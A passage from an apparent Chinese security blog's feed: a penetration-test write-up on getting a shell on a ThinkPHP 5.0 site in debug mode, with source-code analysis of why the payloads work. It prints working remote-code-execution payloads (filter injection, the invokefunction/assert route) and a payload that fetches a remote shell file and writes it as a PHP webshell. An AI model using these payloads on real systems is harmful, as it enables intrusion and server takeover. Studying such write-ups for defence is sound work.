fb581d6a91a64471d2e6168bc052d8ce550225a3001df4093d781a30d2e5faaa65cc93b86a293f6a814f1379085c89b4c685d732ea2f717b8ea2cc05e4d9bcbf0ce72ff5dd4ff215566106c251bf67c94e2e91d6ad034e429a7d7f0fb4c7a18d79a35127a470811cd0f1442bc04cc5010006ab0c58fed37f4b13cfed334bed4eb7f36f4747dce7b28f125a0ae270626a17403ebed497e97fb059f31608bc7103f4094514238832dd12b99ce340a58f4216d81b850d4a5d3525b29a6c62eda16bc4d4c036bafa4f9ac8a0deb646c73a6da034603288d82d98029176c7da356c6a58246582e1cadf91b1f65276b39ebed6304ecb4792ea764a250f0ff1ea36821433e52e7f60b53e36ffa817996a3e3f118791fb5ec9eda6c6dda7774ecb252e62e3373350976028b7db095c17fbaa1d07152e9307ad98ddf00e1009f0388cc862accad08c54202003590422e9a9ad45bbf27a82d47f2452211e0a6cee87e8171decd341e9c88426c0fd804d7d843e3038f6eda70ec0eddf5ecd6d66b804915bd9d955ad26ef26463d1b1a89640d9d5c7e989f161482b4569a6deaa50395e01464ca72a9b39988fdc1552d9d83cfdbd1c271e59072172df921258a96708eea531722a0dbd4fabd19862e0da55a8c3e947aa2df1b274ee51ea3e38a244f2fbb1639d6422a95e44e5bb0578313e0a5b60ad298bc0901b745eed780c33d38947a63f32e0db1a968d5cf1ad3914a0c917416aa6ce4f352e31509849201cf0df5c0bc98ee1ce2feb8c040cb54c4151cea46a236bc59adc1741031c0cbb1636755864191f8cabdb7d63268b60c0307c56cffa9fbb26a2be8e8cb2ecb2d244e7ec8bcbdbd2ed762a8a9beca97c6de6d30ad6a641d8b917b07c7b5dee5679f1939cefe701426ef2e207cda4467c30764bb72ae974d9692577ffbb456164ed175ae45ef755e8e77c383010af55efad5b295fb5a5152839e6c1fd66e160e102c0236b3730ac8d17aec634e732fbf6e830e45bb9ae38eeef4ee5106940dcfd65d3e77035142ab505ede77707b4109ead145fcfc8ea169fc7d47cdc8b956f04717c9e216222679cf02ce1d1e95780c96f17067eb6f0e1fad729f41d952311a6be22d824814acf431dc974dd4446e34193e14ca0170b477d124e35cb3de53821537d51bc72f9158f7b520a864335ac8ffeab92e1952aa0386e2c84d0183b5b5acb25d57207613323ec42783713b684ef36584f84509b71d8954b46952ab37548020328521001d9b1a95ef8e88b0e96c6035b3d4de14c13f1bb94f9db9fd23caf6980de5b06392b9d5d96d3bc22214789846b7963976c031c60595f364fd46b6fc92b5c074115179ce823143150609f989b42e79996fdcbe2579dc0b777bf4b1bff919d4e9a6229e0a68a455a39f7551f726208778e61e7a55afb63c0b48039de47fa208aab3ffe1254950beb86c25fa17337a10296715823de6e1b8884f824b729c8ecfcaf95e4cfda2057a1437a860e471fd2b7916e943a6c313e0e47c5e89306e18a9a7fad718ffa7d5dc6bbd5b880878997992424acb78aedfbe129ac6cfed7174f3009dc29c82ab9f7cabb33a2237eec82e05ce15250ea21c2a60a06d2f7c736c59f91362f7db862d2f893aeda52fd7175b06a78bbe80f40fa66260c7093a9487c995ee78ce92318831dec74a863b3b8b3c7b1e7bab2e02edb3f30904f89ff9900eba2f166cce66f0ba745faa050dff3cc59807153c9790705f287c2ac24c1714b7c23a115dab8ea03b9480dedb61c49333951b4a08254726b485e82e0e3f3877ad5af560f83a6a07c1a218697674715311b2e938ba4d6b7a747735a4d7eb99b7b017cfbdab1ea0447256c66e880a7c8d59c6e7e0b0ea0a6aa781e48917b4b3dd02b9002abf33d40a2845c6636fa4694841782c9b00be83ab5aa5dd81e25d59e7359bbe7a69f0c815b367fb6cb60d525f9a3ffd5e645a6aebc3a3c3752b37b5708f761d960eb1f386042fef73517400261df03c9f817d96349da8dae4673de78ef2fca95ef5f5c4a150d7f4d40a8d30ecd6660f2187c55211875498bb6610a3df741f19305fd8b5cc95aa3f609691129c6d583ec6b40a7ec37c83ef9ea21137a23b84fdebc5b870c84486a6b071ada526454323aa3a8f63285cacfbd79dadcd3a69cfd8201d674ce5032ad834df35a6166df0fef48e9d2ad757358e9b8794147a4dde47f2a1bd3bc8297ca2c656a3e84b1ac3f285aa44cd85d8b14e13906d9808961288dcf5e0451c358d241166cc0157859f8700536cd53ba6e0cca87b7a2f039622de86e526327403b1cfa3ef16ec654a45241fe4a074b5482d476c288f236b0e275640a16e5c2bed1258d0a0e27e18ef68c936c94e2697cad27d95cce84c15219677bd9e00aa0cb630da72e5b57720b78d495c8ecef865fdb8c766715b468f0493e0a75a2f2ca2be84e25e9c0f6dcaea4bf4912a79ccd7068b0ec1baf65fa63d586137bc2f59b5c25c7c58c82d448daf77f49747a76cba0d85c495d085b5aa5bf39cb1485f6f51951931c089a2b5d7e8ac7b3bfee5769da78513ebab7f1ddc5d37f3044c9d2244b2c964977df8380b784fdc88918c97ae0256b207b0332b65a81babd0411aa7a6b82da1e2d7204097f1da1d5e46803721c925c1ce9f4ba0c1564cf0e2b6e09cfae9bd0de3d95cf057eb812c43f9625a0eaab1a47bd9a50f9fc578971962ce7ff5986374f244919e4f2ca17ca5adf2015d2b604c76f394e65cf1c7cce5002fae5c22a914245a695f7b9cd6683dde829b8081ca4d751bcaa27b5f57b9be400d11d0c858bdf63e11aad066e711a04d64dcf8145984cb2675f955172aa35b68086de609a5b7afb5195f189c99a8dd3733346d8ec54e7baa47d3a35dbe57605d708e9e095987def02ed4bda59a8c0b4538d1ad0a47bf08ddedc15c9e417813f747ec447a1e04e13cfe77bf5c79c4a4a00fad86b176b9ba9b5fd3f9e332896594248f13db5ce5f17ad359049b6f4bf6629220c283e3d4fb77229b706daaa082474fd97dcc5bebc89e83142611668a60431734afd9236f8a5a71f093c741af67d1f8c887fdbcc87d32bc63ded3914145303d819e5663ef6f6fe8106cec79e6d6bd87b5328e8a9cf9e942f733424d472418462b4988471394246b505dfe33ac4a47ccd293e78d3cbff259bb089c21ba05b760321899716d1cba0c51703c40d34b2f6330468e43d4c58bcc700cf9b705d25565560b8ec529b2741d0f3b68a8fc30c915cded28cc9ed625249f29dce3836eb2b843fbdb16fed62b7dce0f36662c22673c5128e07f57913e038c1e66f6ae9883a9c27482eafc1ec66b8ddc6889c11e8fcdd0392178e8a03488fbc2234b4de9f109dfde9b92c2ec8b35a1acd4ae8a9962a8d01cf88b599d1ad4b12fd996c801380b14b1756bc1ff5fa09af479c9216839ef0104f0433e3ded7ab2fd9bb977d9a38a90a55d23784b915afe4834f15d0a210e8de054c70538350ef4bf76de27e95fc2e3a91ff7ab814afa9592c8cef066888c71d48ada3cb046fc55fa2e50d0525e0386745a859ee9783af5162a83311dfd5ea88485e13d2e555d8df96af741b70ac34c5119529a29221a933f66e9b7d478b228ebe3c42ebf364b38e2ee7a67afc140a82561837395bac967547a135fbd96e87837ee7c7864737e90f54a9e53b187157aef9970698d1c2605fe54739b3b8045162052187f7dc2a51c46f916e13ddfecb35b1abd5e423f2f94d23660d6df57dae07bc144d9153025e31263aadcc25bb6070097fea6aac7f3ced82f78fbf7a77459e0245aa3dd90645fb0fd9976e0567585e679262449739b3580d0ba6a4b27debb24f44b5ec0da1e6526527620524a7debb83ef4c9649452130787c33250c4425a0d2941d8e61e932c371ea91d049e526e5b4c78b6bf0d40effbac62c47c30c46d10d80fa1fa18ff8650114c48bca05ceb253a502ee81a47a7c4d0bb04b6a531d1220c8b47c5ed418a72b526f67b1fd0af495e00db9738f90b4ce3d780f873ab26bb8ef764ad57071d81dd674a744ac11e4dcc450ffe15f305a2dbb61a0fc052518dc13e955087d18235c7b27fb2645594faaaba97b32b8f71995c726be6d222e7bc5ebbbb77628a6e61d4ed61ad5581aaeaab48d08d3de9195151b4342f3b74cc9a6a8e62e7e064c91851d5466da4580ea31319c30927f5e43031be3a73e36a85c5ffdb91f319738908795ae930941979bab98e7d5b0ef669de9c9013699f096297b27594c92cdfa298a38fe2555297fba2ac01188dd277ce29ca64d9a3765e629d653e36b44de38108159a60cde8b18fac315a96f26680b6d362a6f24347235f68ab9ca9f99066a371571728e7a6b20b868ad920eeeba295544c480077b867ca2d4e1437663d2947795280672b297423013062c47bcf7f584e90477361dc9cabaa0cf727beba209f6469b90858c648c2f9ff3f94e95a1137bf5a41ecf9f85a5881dfc9650f9d5ec1182e39cd64a7791997f223c15818d6820ad0ab8fb40879b1e8a6b96d054783d6d804d19bf737082fe24a756e90870830691ffff694ef05408f21e78bedd9f4ee927b6a49fc0229545e413dbecfeb4ea75d7e829b1ca1eef5fb048aa02de51b8f49febecf3df8eb9120c7040425376ee9a8f459cd06d06c9f03695702bc0738e987f3bf83cb3f141d3f801c1b8bf36a42d6f9f5dbc5ebba2e3128068df5ba590167548eb31e38c4c6b688ba96b347002097ec150984d46e7e7d4e036d3210040e546fe29abb5598ccffa65520bd4cac2da5f630226c5e9f64699c2685863f3b06c99915a89070cef290e94bd839485d9ce242e7851424f4648d802582b5ce7fa357ea6fc5557736fc291ae7750c4cbc5d0f9a1215c6201dcf13a420f5579411e5176d4857afdc0f7277f47243b1ade9a6164d09b6301016f3d28f23c3d220f7870cf064e8ecc77b26000a0ba9ede7312525501fd14c99f6084e7df7706cff988994d740a66bc3b00f93c8d4f5bff62670caf841bd8fc3d3dc89ceb004dca033ad108e6be0b57e246a06404196d09e09155b24e041d2bb1aaad3f0c0b53fe031348262d19ef460e63a88d76825556503a62d3f6b73b8f4070677e5829f3cb66c2ca7ffbc9175ae89068612aa930abf6e409def9ed5ab1c0a6b80dec916a9fb6fabaccad0b68fb3921d9a3171a1a8c8fa2b70d9d371482bb478f9fac4401f5c69a6028b5e5af4305941f000708086992b9add235f72b9dc1a46e788bbd4dd40ef31d127a7dcb622b6f3fef388c2f2997201319e95c1065304319f4ed921f25fadcf83ca9b96dd008f964fab32c59b90c9822b14f3951359a95173a97c4b0198112291cd7ecbfe82504197cd30834b68d229d4e9d1d322dbeed9b56a3aaa818ffd5a6f6a0345c0efaa721bf6bac5db089248a5c76d8147024f3a7c5856f26e68b4aad861c918fe9b04d3a5aff7a7a685d2d7c1cc36ed55511162915f467ab4555f9db61466f03219d24c3ecc75861fa42a3015c8d4262dd589f60533b4a21b858ee89b1f96d2a798613edf8559f86158dcfcffc711ee07237957ebe9b95f592b80b6f5beea3c7dcbe639748b4be1a3944b3b4a5c30f1b94fd16461940d480d2c00851c32946ba75bf917f5130af9b2e9386a08ef13041b4014d8cf69d0844f4920984e9ff2b3196b1350a00ec7a00b39d52ca4c6cc33d31dd382ddebdadc561b3866cfcde8694f2ec4c45b68a78256d79da8ff0b5435f899f508fd1ba3725ad47f108a1fb0cc84976cc059bf768f08ad0948b6088dfae09486a13f68732d41dfb54557f7be6220a83a3393a04ede5cc8695775c55a1757ceda7b2566e67afd921195d7a85bd9ca408598be15ee9720eb46f0172cedba481cff3ce8511b197abd9d1788e203b22aa4c2391a4750cead987a4406cd516a82013504beca654c806530cf46f833f3ac49d60fd7333d9f243b7f8c7f6c3b4e3a6213caf3470842eb10d1b451c76eeae233b934c3fa704493315fe422c8712e81cb6de28d99640a24553eebd0f25e1943dcd4914c84b27aa6f95083d40be7ccb2ab49a1ab5b862f424dd1770736bb37b4a91c87d06f2266b9f224bee54f92732ef521bdd1c9689bbd77d9d848d3d4a46ae27bfd351adb9f57216eb22f496993684883f7df2436ee469686e579f580c4285ecd1d2d4b16366d76f9eab589891e385234f4fef50f2443098407643e9a2143faa63d0a64ceee8d8d7d9888338ac00c7545b8e1ee66ae1fd9fa56e20aa3eb21e507e96782f15c5f4516bb03cc57d0ef79778135a559dcd33806ab4fe9adc9db19464d605405ab89a468a6328dbde40916999f22dc2ae19e3178f2e2b6768ae2b05ad8e63d1e717d9292fb47e49f01ed32b088b25ceeef29ad064c29c43e5fde4ee23c7faed38cc226880b41625d5f755fbf49dd21daf3d7b5fc3d12acb75865c95bc967f4cf2353cb09f4abeaea5f8e8d0cd75f11049ee15bdd7f4ead047d1d556c8df8f2d19c93c18b2dd9e9e49093c23bf32965a42f6df3758cb8d4a6f40cb869535a118e3407a813ee8a7fa31f569301190d47fecae4a1659011f7b4803c8bf79bb860663830ccdf5425f2a4d6b14af9c806c45890f93fa898722a755f45b29a0ba6514984142dd4a8ead09db4778b18f3dbef7c70d6c6d2975361577edf07d6e16ae29368273917c3f1025de90432cad5101e4afdb5f6728c53e3cc1519be5cc5c1e89ddc3cdf1b906c1ab36cecbcc0f373998d61693c6e9ae29557c14d608a1bfcc9d8a4067698eebd31d746ffd17e868f2d9289fdde24dcc767958921d6c82a6aa4f95f185cf441eadd4992f94efb5f5be5cd9db6fd064149ebd95047859d207dff9a47093d470e973e6ccd1e8169da5a89a22fa65f99d3b4292b46b5ca255ada6bdaea1ab52387ea0439dc5d0733aaf8135a5a5abd6aad1cb9bffef951793d1377c35e0eeb7d82ebf36b7bc5726d4e73683c4dd054e4ea5061a3e33fb9e770bf25105a905bcd1ae347ce8f2b6c7f16f0710e1512c4ae46410f642ca022b597805ba26dcfd2f76599da0d70658e4f3a7f452677397414088b3f5ff6eb24185f574d390532b6b3681235cf5ca2197deccf09373e1e7811fc1de2b116ac6e6e8d1416cf441114c9f64da5348d1d852d8a13dac191aa063db04a2e952a9d7a47e4247</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>渗透记实|ThinkPhp绕过限制GetShell</title>
    <link href="https://www.se7ensec.cn/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/"/>
    <id>https://www.se7ensec.cn/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/</id>
    <published>2020-02-14T02:10:24.000Z</published>
    <updated>2020-11-14T19:59:20.128Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文章首发无法溯源安全团队公众号</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>项目里遇到一个站，用的是ThinkPHP V5.0.*框架，且开启了debug模式，本以为一发payload的就能解决的事情，没想到拿下的过程还得小绕一下…</p><h1 id="0x02-踩坑"><a href="#0x02-踩坑" class="headerlink" title="0x02 踩坑"></a>0x02 踩坑</h1><ol><li>尝试命令执行，system被限制了</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/1.png"></p><ol start="2"><li>尝试包含日志文件，open_basedir限制了</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/2.png"></p><ol start="3"><li>这里有个思路，可以去包含runtime下的日志文件，但是thinkphp的日志文件比较大，而且有时候会有很多奇怪的问题阻断代码执行，暂且作为备选方案</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/3.png"></p><ol start="5"><li>尝试通过thinkphp本身Library中设置Session的方法把脚本写入tmp目录里的Session文件，然后进行包含</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>但是。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/4.png"></p><h1 id="0x03-GetShell"><a href="#0x03-GetShell" class="headerlink" title="0x03 GetShell"></a>0x03 GetShell</h1><p>俗话说，三个臭皮匠顶一个诸葛亮，求助师傅们后，给出了解决的办法</p><ol><li>Noel 师傅的解决方法及分析：</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/5.png"></p><p>Request.php的filtervalue函数下存在call_user_func,根据Payload，跟踪下流程</p><p>首先会进入App.php的Run方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request $request = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        ………………………………</span><br><span class="line">        <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            <span class="comment">/*执行当前类的routeCheck方法,获取调度信息,如访问index模块下index控制器里的index方法,则</span></span><br><span class="line"><span class="comment">                $dispatch = array(2) &#123; [&quot;type&quot;]=&gt; string(6) &quot;module&quot;</span></span><br><span class="line"><span class="comment">                    [&quot;module&quot;]=&gt; array(3) &#123;</span></span><br><span class="line"><span class="comment">                        [0]=&gt; string(5) &quot;index&quot; [1]=&gt; string(5) &quot;index&quot; [2]=&gt; string(5) &quot;index&quot; &#125; &#125;</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            $dispatch = <span class="built_in">self</span>::routeCheck($request, $config);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录当前调度信息 将获取的调度信息,即模块,控制器,方法名存入Request类的dispatch属性中</span></span><br><span class="line">        $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录路由和请求信息 调式模式,在\application\config.php 参数app_debug可配置</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::$debug) &#123;</span><br><span class="line">            Log::record(<span class="string">&#x27;[ ROUTE ] &#x27;</span> . var_export($dispatch, <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">            Log::record(<span class="string">&#x27;[ HEADER ] &#x27;</span> . var_export($request-&gt;header(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">            Log::record(<span class="string">&#x27;[ PARAM ] &#x27;</span> . var_export($request-&gt;param(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ………………………………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们主要关注routeCheck和param两个函数，先看routeCheck</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params">$request, <span class="keyword">array</span> $config</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[<span class="string">&#x27;pathinfo_depr&#x27;</span>];</span><br><span class="line">        $result = <span class="literal">false</span>;</span><br><span class="line">      ………………………………</span><br><span class="line">        <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">        $result = Route::check($request, $path, $depr, $config[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>主要是将请求参数什么的传入，经过check后就基本上都处理好了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/6.png"></p><p>在调试模式开启的情况下可以进入param函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">            $method = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p> 跟进input函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params">$data = [], $name = <span class="string">&#x27;&#x27;</span>, $default = <span class="literal">null</span>, $filter = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">      $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line">      <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">          array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], $filter);</span><br><span class="line">          reset($data);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>getFilter取出filter的值，在这里也就是assert</p><p>array_walk_recursive</p><blockquote><p>array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。该函数与 <a href="https://www.runoob.com/php/func-array-walk.html">array_walk()</a> 函数的不同在于可以操作更深的数组（一个数组中包含另一个数组）。</p></blockquote><p>及对$data的每一个元素应用filterValue函数，跟进filterValue</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;$value, $key, $filters</span>)</span>&#123;</span><br><span class="line"> ......   </span><br><span class="line"><span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>铳梦师傅的解决方法及分析：</li></ol><p>payload参考：</p><p>来自：<a href="https://xz.aliyun.com/t/3570#toc-4">https://xz.aliyun.com/t/3570#toc-4</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>执行phpinfo（这里注意看 ?s= 后的参数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;?s&#x3D;..&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>拿shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;?s&#x3D;..&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;copy(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;shell.txt&#39;,&#39;test.php&#39;)</span><br></pre></td></tr></table></figure><p>为什么要这么构造呢，给出当前的目录情况以及分析：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/7.png"></p><p>Route.php的parseUrl函数会对url进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params">$url, $depr = <span class="string">&#x27;/&#x27;</span>, $autoSearch = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        .......</span><br><span class="line">        $url              = str_replace($depr, <span class="string">&#x27;|&#x27;</span>, $url);</span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="built_in">self</span>::parseUrlPath($url);</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先将url中的<code>/</code>替换为<code>|</code>之后是parseUrlPath将url分割</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">     $url = str_replace(<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, $url);</span><br><span class="line">     $url = trim($url, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">     $var = [];</span><br><span class="line">     <span class="keyword">if</span> (<span class="literal">false</span> !== strpos($url, <span class="string">&#x27;?&#x27;</span>)) &#123;</span><br><span class="line">......</span><br><span class="line">         ......</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (strpos($url, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">         <span class="comment">// [模块/控制器/操作]</span></span><br><span class="line">         $path = explode(<span class="string">&#x27;/&#x27;</span>, $url);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         ......</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> [$path, $var];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>得到如下三部分</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/8.png"></p><p>模块加载时Loder.php下的parseName函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params">$name, $type = <span class="number">0</span>, $ucfirst = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($type) &#123;</span><br><span class="line">        $name = preg_replace_callback(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$match</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> strtoupper($match[<span class="number">1</span>]);</span><br><span class="line">        &#125;, $name);</span><br><span class="line">        <span class="keyword">return</span> $ucfirst ? ucfirst($name) : lcfirst($name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> strtolower(trim(preg_replace(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, $name), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/9.png"></p><p>现在就会实例化\Think\app类并执行invokefunction方法</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/10.png"></p><p>所以加<code>../\</code>的原因是可以再往前跳一层</p><h1 id="0x04-bypass-disable-functions"><a 